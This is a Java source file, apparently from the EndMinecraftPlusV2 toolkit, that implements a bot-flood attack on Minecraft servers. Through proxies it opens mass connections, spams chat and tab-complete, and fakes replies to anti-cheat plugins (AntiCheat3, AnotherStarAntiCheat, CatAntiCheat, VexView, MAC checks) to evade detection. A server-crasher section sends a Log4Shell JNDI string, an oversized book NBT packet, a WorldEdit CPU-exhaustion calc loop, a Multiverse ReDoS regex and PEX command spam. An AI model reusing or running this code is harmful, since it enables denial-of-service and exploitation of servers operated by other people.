package cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.AttackUtils;

import cn.serendipityr.EndMinecraftPlusV2.EndMinecraftPlusV2;
import cn.serendipityr.EndMinecraftPlusV2.Tools.*;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.AttackManager;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ACProtocol.AnotherStarAntiCheat;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ACProtocol.AntiCheat3;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.CatAntiCheat.CatAntiCheat;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.OldVersion.ForgeProtocol.MCForge;
import cn.serendipityr.EndMinecraftPlusV2.VersionControl.VersionSupport107;
import io.netty.util.internal.ConcurrentSet;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.data.game.ItemStack;
import org.spacehq.mc.protocol.data.game.values.ClientRequest;
import org.spacehq.mc.protocol.data.message.Message;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientKeepAlivePacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientRequestPacket;
import org.spacehq.mc.protocol.packet.ingame.client.player.ClientPlayerMovementPacket;
import org.spacehq.mc.protocol.packet.ingame.server.*;
import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerPlayerHealthPacket;
import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerPlayerPositionRotationPacket;
import org.spacehq.mc.protocol.packet.ingame.server.entity.player.ServerUpdateHealthPacket;
import org.spacehq.opennbt.NBTIO;
import org.spacehq.opennbt.tag.builtin.CompoundTag;
import org.spacehq.opennbt.tag.builtin.ListTag;
import org.spacehq.opennbt.tag.builtin.StringTag;
import org.spacehq.opennbt.tag.builtin.Tag;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.Session;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.io.NetInput;
import org.spacehq.packetlib.io.buffer.ByteBufferNetInput;
import org.spacehq.packetlib.io.stream.StreamNetInput;
import org.spacehq.packetlib.io.stream.StreamNetOutput;
import org.spacehq.packetlib.packet.Packet;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BotAttack extends IAttack {
    public static HashMap<Session, String> clientName = new HashMap<>();
    public static int failed = 0;
    public static int rejoin = 0;
    public static int clickVerifies = 0;
    public static List<String> rejoinPlayers = new ArrayList<>();
    public static List<Session> joinedPlayers = new ArrayList<>();
    public static List<Session> alivePlayers = new ArrayList<>();
    public static HashMap<Session,ServerPlayerPositionRotationPacket> positionPacket = new HashMap<>();
    protected boolean attack_motdbefore;
    protected boolean attack_tab;
    protected Map<String, String> modList;

    private Thread mainThread;
    private Thread taskThread;

    public Set<Client> clients = new ConcurrentSet<>();
    public ExecutorService pool = Executors.newCachedThreadPool();

    private static final AntiCheat3 ac3 = new AntiCheat3();
    private static final AnotherStarAntiCheat asac = new AnotherStarAntiCheat();

    private long starttime;

    public BotAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setBotConfig(boolean motdbefore, boolean tab, Map<String, String> modList) {
        this.attack_motdbefore = motdbefore;
        this.attack_tab = tab;
        this.modList = modList;
    }

    public String getRandMessage(String userName) {
        return ConfigUtil.CustomChat.get(new Random().nextInt(ConfigUtil.CustomChat.size())).replace("$rnd",OtherUtils.getRandomString(4,6).replace("$pwd",DataUtil.botRegPasswordsMap.get(userName)));
    }

    public void start() {
        setTask(() -> {
            while (true) {
                List<Session> tempList = new ArrayList<>(alivePlayers);

                for (Session c:tempList) {
                    if (c.isConnected()) {
                        if (c.hasFlag("login")) {
                            if (ConfigUtil.ChatSpam && !c.hasFlag("chatSpam")) {
                                c.setFlag("chatSpam", true);

                                new Thread(() -> {
                                    while (c.isConnected()) {
                                        OtherUtils.doSleep(ConfigUtil.ChatDelay);
                                        try {
                                            c.send(new ClientChatPacket(getRandMessage(clientName.get(c))));
                                        } catch (Exception ignored) {}
                                    }
                                }).start();
                            }

                            if (ConfigUtil.RandomTeleport && !c.hasFlag("randomTeleport")) {
                                c.setFlag("randomTeleport", true);

                                new Thread(() -> {
                                    while (c.isConnected()) {
                                        ServerPlayerPositionRotationPacket positionRotationPacket = positionPacket.get(c);

                                        if (c.isConnected() && positionRotationPacket != null) {
                                            MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX() + OtherUtils.getRandomInt(-10, 10), positionRotationPacket.getY() + OtherUtils.getRandomInt(2, 8), positionRotationPacket.getZ() + OtherUtils.getRandomInt(-10, 10), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                            OtherUtils.doSleep(500);
                                            MultiVersionPacket.sendPosPacket(c, positionRotationPacket.getX(), positionRotationPacket.getY(), positionRotationPacket.getZ(), OtherUtils.getRandomFloat(0.00, 1.00), OtherUtils.getRandomFloat(0.00, 1.00));
                                        } else {
                                            OtherUtils.doSleep(1000);
                                        }
                                    }
                                }).start();
                            }

                            if (ConfigUtil.ServerCrasher && !c.hasFlag("crasher")) {
                                new Thread(() -> {
                                    c.setFlag("crasher", true);

                                    LogUtil.doLog(0, "[" + clientName.get(c) + "] 开始发送Crash Packet...", "ServerCrasher");

                                    switch (ConfigUtil.ServerCrasherMode) {
                                        case 1:
                                            if (MCForge.getProtocolVersion() == 47) {
                                                while (c.isConnected()) {
                                                    try {
                                                        ItemStack crashBook = getCrashBook();

                                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                                        StreamNetOutput out = new StreamNetOutput(buf);

                                                        out.writeShort(crashBook.getId());
                                                        out.writeByte(crashBook.getAmount());
                                                        out.writeShort(crashBook.getData());

                                                        NBTIO.writeTag(new DataOutputStream(buf), crashBook.getNBT());

                                                        byte[] crashData = buf.toByteArray();

                                                        c.send(new ClientPluginMessagePacket("MC|BEdit", crashData));
                                                        c.send(new ClientPluginMessagePacket("MC|BSign", crashData));

                                                        OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
                                                    } catch (Exception ignored) {}
                                                }
                                            } else {
                                                LogUtil.doLog(0, "Book Crash仅适用于1.8.X版本。", "ServerCrasher");
                                            }
                                            break;
                                        case 2:
                                            String log4jExploit = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
                                            c.send(new ClientChatPacket(log4jExploit));
                                            break;
                                        case 3:
                                            String worldEdit = "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}";
                                            c.send(new ClientChatPacket(worldEdit));
                                            break;
                                        case 4:
                                            String multiverseCore = "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
                                            c.send(new ClientChatPacket(multiverseCore));
                                            break;
                                        case 5:
                                            String pex_1 = "/pex promote a a";
                                            String pex_2 = "/pex demote a a";
                                            while (c.isConnected()) {
                                                c.send(new ClientChatPacket(new Random().nextBoolean() ? pex_1:pex_2));
                                                OtherUtils.doSleep(2000);
                                            }
                                            break;
                                        default:
                                            LogUtil.doLog(1, "ServerCrasher Mode设置有误，请检查配置文件。", null);
                                            break;
                                    }
                                }).start();
                            }

                            if (ConfigUtil.TabAttack && !c.hasFlag("tabAttack")) {
                                c.setFlag("tabAttack", true);

                                new Thread(() -> {
                                    while (c.isConnected()) {
                                        MultiVersionPacket.sendTabPacket(c, "/");
                                        OtherUtils.doSleep(100);
                                    }
                                }).start();
                            }
                        } else {
                            if (ConfigUtil.RegisterAndLogin) {
                                try {
                                    for (String cmd:ConfigUtil.RegisterCommands) {
                                        OtherUtils.doSleep(ConfigUtil.ChatDelay);
                                        c.send(new ClientChatPacket(cmd.replace("$pwd",DataUtil.botRegPasswordsMap.get(clientName.get(c)))));
                                    }

                                    LogUtil.doLog(0, "[" + clientName.get(c) + "] 注册信息已发送。", "BotAttack");

                                    c.setFlag("login", true);
                                } catch (Exception ignored) {}
                            } else {
                                c.setFlag("login", true);
                            }
                        }
                    } else {
                        alivePlayers.remove(c);
                    }
                }

                OtherUtils.doSleep(1000);
            }
        });

        this.starttime = System.currentTimeMillis();

        mainThread = new Thread(() -> {
            while (true) {
                try {
                    createClients(ip, port);

                    if (this.attack_time > 0 && (System.currentTimeMillis() - this.starttime) / 1000 > this.attack_time) {
                        for (Client c : clients) {
                            c.getSession().disconnect("");
                        }

                        stop();
                        return;
                    }

                    OtherUtils.doSleep(ConfigUtil.ConnectTimeout);
                    LogUtil.doLog(0, "当前连接数: " + clients.size() + "个", "BotAttack");
                    cleanClients();
                } catch (Exception e) {
                    LogUtil.doLog(1, "发生错误: " + e, null);
                }
            }
        });

        mainThread.start();
        if (taskThread != null) {
            taskThread.start();
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        mainThread.stop();
        if (taskThread != null) {
            taskThread.stop();
        }
    }

    public void setTask(Runnable task) {
        taskThread = new Thread(task);
    }

    private void cleanClients() {
        for (Client client:clients) {
            if (!client.getSession().isConnected()) {
                positionPacket.remove(client.getSession());
                alivePlayers.remove(client.getSession());
                clientName.remove(client.getSession());
                clients.remove(client);
            } else {
                if (!alivePlayers.contains(client.getSession()) && (client.getSession().hasFlag("login") || client.getSession().hasFlag("join"))) {
                    alivePlayers.add(client.getSession());
                }
            }
        }
    }

    private void createClients(final String ip, int port) {
        Proxy.Type proxyType;
        switch (ConfigUtil.ProxyType) {
            case 3:
            case 2:
                proxyType = Proxy.Type.SOCKS;
                break;
            case 1:
            default:
                proxyType = Proxy.Type.HTTP;
                break;
        }

        while (clients.size() <= this.attack_maxconnect) {
            for (String p: ProxyUtil.proxies) {
                try {
                    if (!EndMinecraftPlusV2.isLinux) {
                        SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clients.size() + "个 | 失败次数: " + failed + "次 | 成功加入: " + joinedPlayers.size() + "次 | 当前存活: " + alivePlayers.size() + "个 | 点击验证: " + clickVerifies + "次 | 重进尝试: " + rejoin);
                    }

                    String[] _p = p.split(":");
                    Proxy proxy = new Proxy(proxyType, new InetSocketAddress(_p[0], Integer.parseInt(_p[1])));
                    String[] User = AttackManager.getRandomUser().split("@");
                    Client client = createClient(ip, port, User[0], proxy);
                    client.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                    client.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                    clientName.put(client.getSession(), User[0]);
                    clients.add(client);

                    pool.submit(() -> {
                        if (this.attack_motdbefore) {
                            getMotd(proxy, ip, port);
                        }

                        client.getSession().connect(false);
                    });

                    if (this.attack_joinsleep > 0) {
                        OtherUtils.doSleep(attack_joinsleep);
                    }
                } catch (Exception e) {
                    LogUtil.doLog(1, "发生错误: " + e, null);
                }
            }
        }
    }

    public Client createClient(final String ip, int port, final String username, Proxy proxy) {
        Client client = new Client(ip, port, new MinecraftProtocol(username), new TcpSessionFactory(proxy));
        if (ConfigUtil.ForgeSupport) {
            modList.putAll(ConfigUtil.ForgeModList);
            new MCForge(client.getSession(), modList).init();
        }

        client.getSession().addListener(new SessionListener() {
            public void packetReceived(PacketReceivedEvent e) {
                new Thread(() -> {
                    try {
                        handlePacket(e.getSession(), e.getPacket(), username);
                    } catch (IOException ex) {
                        throw new RuntimeException(ex);
                    }
                }).start();
            }

            public void packetSent(PacketSentEvent e) {
            }

            public void connected(ConnectedEvent e) {
                if (ConfigUtil.SaveWorkingProxy) {
                    ProxyUtil.saveWorkingProxy(proxy);
                }
            }

            public void disconnecting(DisconnectingEvent e) {
            }

            public void disconnected(DisconnectedEvent e) {
                new Thread(() -> {
                    String msg;

                    if (e.getCause() == null) {
                        msg = e.getReason();
                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + msg, "BotAttack");

                        for (String rejoinDetect:ConfigUtil.RejoinDetect) {
                            if (rejoinPlayers.contains(username)) {
                                break;
                            }

                            if (msg.contains(rejoinDetect)) {
                                rejoinPlayers.add(username);

                                for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
                                    OtherUtils.doSleep(ConfigUtil.RejoinDelay);

                                    Client rejoinClient = createClient(ConfigUtil.AttackAddress, ConfigUtil.AttackPort, username, proxy);
                                    rejoinClient.getSession().setReadTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));
                                    rejoinClient.getSession().setWriteTimeout(Math.toIntExact(ConfigUtil.ConnectTimeout));

                                    rejoin++;
                                    LogUtil.doLog(0,"[假人尝试重连] [" + username + "] [" + proxy + "]", "BotAttack");
                                    clientName.put(rejoinClient.getSession(), username);
                                    clients.add(rejoinClient);
                                    rejoinClient.getSession().connect(false);

                                    if (rejoinClient.getSession().hasFlag("join") || rejoinClient.getSession().hasFlag("login")) {
                                        rejoinPlayers.remove(username);
                                        break;
                                    }
                                }

                                rejoinPlayers.remove(username);

                                break;
                            }
                        }
                    } else if (ConfigUtil.ShowFails) {
                        LogUtil.doLog(0,"[假人断开连接] [" + username + "] " + e.getCause(), "BotAttack");
                    }

                    failed++;
                    alivePlayers.remove(client.getSession());
                }).start();
            }
        });

        return client;
    }

    public void getMotd(Proxy proxy, String ip, int port) {
        try {
            Socket socket = new Socket(proxy);
            socket.connect(new InetSocketAddress(ip, port));

            if (socket.isConnected()) {
                OutputStream out = socket.getOutputStream();
                out.write(new byte[]{0x07, 0x00, 0x05, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01});
                out.write(new byte[]{0x01, 0x00});
                out.flush();
            }

            socket.close();
        } catch (Exception ignored) {}
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) throws IOException {
        if (recvPacket instanceof ServerPluginMessagePacket) {
            ServerPluginMessagePacket packet = (ServerPluginMessagePacket) recvPacket;

            switch (packet.getChannel()) {
                case "AntiCheat3.4.3":
                    String code = ac3.uncompress(packet.getData());
                    byte[] checkData = ac3.getCheckData("AntiCheat3.jar", code,
                            new String[]{"44f6bc86a41fa0555784c255e3174260"});
                    session.send(new ClientPluginMessagePacket("AntiCheat3.4.3", checkData));
                    break;
                case "anotherstaranticheat":
                    String salt = asac.decodeSPacket(packet.getData());
                    byte[] data = asac.encodeCPacket(new String[]{"4863f8708f0c24517bb5d108d45f3e15"}, salt);
                    session.send(new ClientPluginMessagePacket("anotherstaranticheat", data));
                    break;
                case "VexView":
                    if (new String(packet.getData()).equals("GET:Verification"))
                        session.send(new ClientPluginMessagePacket("VexView", "Verification:1.8.10".getBytes()));
                    break;
                case "MAC|Check":
                    if (ConfigUtil.RandomMAC) {
                        byte[] MACAddress;

                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                        StreamNetOutput out = new StreamNetOutput(buf);

                        for (int i = 0; i < 6 ; i++) {
                            byte[] bytes = new byte[1];
                            new Random().nextBytes(bytes);
                            try {
                                out.writeByte(bytes[0]);
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }
                        }

                        MACAddress = buf.toByteArray();
                        LogUtil.doLog(0, "[" + username + "] 已发送随机MACAddress数据。(" + Arrays.toString(MACAddress) + ")", "MACCheck");
                        session.send(new ClientPluginMessagePacket(packet.getChannel(), MACAddress));
                    }
                    break;
                case "CatAntiCheat":
                case "catanticheat:data":
                    if (ConfigUtil.CatAntiCheat) {
                        CatAntiCheat.packetHandle(session, packet.getChannel(), packet.getData(), username);
                    }
                    break;
                default:
            }
        } else if (recvPacket instanceof ServerJoinGamePacket) {
            session.setFlag("join", true);
            LogUtil.doLog(0, "[假人加入服务器] [" + username + "]", "BotAttack");

            joinedPlayers.add(session);

            if (!alivePlayers.contains(session)) {
                alivePlayers.add(session);
            }

            MultiVersionPacket.sendClientSettingPacket(session, "zh_CN");
            MultiVersionPacket.sendClientPlayerChangeHeldItemPacket(session, 1);
        } else if (recvPacket instanceof ServerPlayerPositionRotationPacket) {
            try {
                ServerPlayerPositionRotationPacket packet = (ServerPlayerPositionRotationPacket) recvPacket;
                MultiVersionPacket.sendPosPacket(session, packet.getX(), packet.getY(), packet.getZ(), packet.getYaw(), packet.getYaw());
                session.send(new ClientPlayerMovementPacket(true));
                MultiVersionPacket.sendClientTeleportConfirmPacket(session, packet);

                if (!positionPacket.containsKey(session)) {
                    positionPacket.put(session, packet);
                }
            } catch (Exception ignored) {}
        } else if (recvPacket instanceof ServerChatPacket) {
            ServerChatPacket chatPacket = (ServerChatPacket) recvPacket;
            Message message = chatPacket.getMessage();

            clickVerifiesHandle(message, session, username);

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (ConfigUtil.ShowServerMessages && !message.getFullText().equals("")) {
                LogUtil.doLog(0, "[服务端返回信息] [" + username + "] " + message.getFullText(), "BotAttack");
            }
        } else if (recvPacket instanceof ServerKeepAlivePacket) {
            if (MCForge.getProtocolVersion() >= 107) {
                VersionSupport107.sendKeepAlivePacket(session, (ServerKeepAlivePacket) recvPacket);
            } else {
                ClientKeepAlivePacket keepAlivePacket = new ClientKeepAlivePacket(((ServerKeepAlivePacket) recvPacket).getPingId());
                session.send(keepAlivePacket);
            }

            // LogUtil.doLog(0, "[" + username + "] 已发送KeepAlive数据包。", "BotAttack");

            if (!joinedPlayers.contains(session)) {
                joinedPlayers.add(session);
            }

            if (!alivePlayers.contains(session)) {
                alivePlayers.add(session);
            }
        } else if (recvPacket.getClass().getSimpleName().equals("ServerPlayerHealthPacket")) {
            if (recvPacket instanceof ServerPlayerHealthPacket && ((ServerPlayerHealthPacket) recvPacket).getHealth() <= 0) {
                VersionSupport107.sendRespawnPacket(session);

                LogUtil.doLog(0, "[" + username + "] " + "假人于服务器中死亡，已重生。", "BotAttack");
            }
        } else if (recvPacket.getClass().getSimpleName().equals("ServerUpdateHealthPacket")) {
            if (((ServerUpdateHealthPacket) recvPacket).getHealth() <= 0) {
                ClientRequestPacket clientRequestPacket = new ClientRequestPacket(ClientRequest.RESPAWN);
                session.send(clientRequestPacket);
                LogUtil.doLog(0, "[" + username + "] " + "假人于服务器中死亡，已重生。", "BotAttack");
            }
        }
    }

    public static void clickVerifiesHandle(Message message, Session session, String username) {
        boolean needClick = false;

        if (message.getStyle().getClickEvent() != null) {
            for (String clickVerifiesDetect:ConfigUtil.ClickVerifiesDetect) {
                if (message.getText().contains(clickVerifiesDetect)) {
                    needClick = true;
                    break;
                }
            }
        }

        if (needClick) {
            LogUtil.doLog(0, "[服务端返回验证信息] [" + username + "] " + message.getStyle().getClickEvent().getValue(), "BotAttack");
            session.send(new ClientChatPacket(message.getStyle().getClickEvent().getValue()));
            clickVerifies++;
        }

        if (message.getExtra() != null && !message.getExtra().isEmpty()) {
            for (Message extraMessage:message.getExtra()) {
                clickVerifiesHandle(extraMessage, session, username);
            }
        }
    }

    public static ItemStack getCrashBook() {
        ItemStack crashBook;
        CompoundTag nbtTag = new CompoundTag("crashBook");
        List<Tag> pageList = new ArrayList<>();

        // Plain Mode
        nbtTag.put(new StringTag("author", OtherUtils.getRandomString(20, 20)));
        nbtTag.put(new StringTag("title", OtherUtils.getRandomString(20, 20)));

        for (int a = 0; a < 35; a++) {
            pageList.add(new StringTag("", OtherUtils.getRandomString(600, 600)));
        }

        nbtTag.put(new ListTag("pages", pageList));
        crashBook = new ItemStack(386, 1, 0, nbtTag);

        return crashBook;
    }
}
